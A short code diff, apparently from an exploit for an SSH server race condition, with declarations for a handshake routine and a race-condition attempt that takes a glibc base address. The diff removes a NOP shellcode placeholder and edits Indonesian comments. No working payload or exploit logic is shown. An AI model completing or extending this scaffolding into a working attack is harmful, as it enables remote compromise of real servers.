@@ -17,11 +17,8 @@
 #define MAX_STARTUPS 100
 #define CHUNK_ALIGN(s) (((s) + 15) & ~15)
 
-// Shellcode placeholder (replace with actual shellcode)
-unsigned char shellcode[] = "\x90\x90\x90\x90";
-
-int perform_ssh_handshake(int sock);  // Deklarasi fungsi yang hilang
-int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);  // Deklarasi fungsi yang hilang
+int perform_ssh_handshake(int sock);  // Deklarasi fungsi
+int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);  // Deklarasi fungsi
 
 int main(int argc, char *argv[]) {
     if (argc != 3) {
